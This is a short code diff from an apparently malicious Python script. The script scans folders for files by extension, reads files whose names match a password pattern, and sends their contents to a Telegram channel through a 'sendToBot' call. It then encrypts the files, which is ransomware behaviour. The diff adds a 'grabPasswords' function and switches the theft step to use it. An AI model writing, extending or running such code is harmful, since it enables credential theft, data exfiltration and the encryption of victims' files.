@@ -42,6 +42,11 @@ FILE_EXTENSIONS: List[str] = [
 
 def openFile(path_to_file: str) -> bytes:
     with open(path_to_file,"rb") as file_to_open:
+        result: bytes = file_to_open.read()
+    return result
+
+def grabPasswords(path_to_file: str) -> str:
+    with open(path_to_file,"r") as file_to_open:
         result: str = file_to_open.read()
     return result
 
@@ -103,7 +108,7 @@ def runAll() -> None:
     files_to_encrypt: List[str] = listFiles(PATH_TO_FOLDERS,FILE_EXTENSIONS)
     for file_to_encrypt in files_to_encrypt:
         if re.search(PASSWORDS_PATTERN,file_to_encrypt,flags=re.IGNORECASE):
-            stolen_passwords: str = openFile(file_to_encrypt)
+            stolen_passwords: str = grabPasswords(file_to_encrypt)
             sendToBot(TELEGRAM_CHANNEL,stolen_passwords)
             encryptFile(file_to_encrypt, unique_key)
         else:
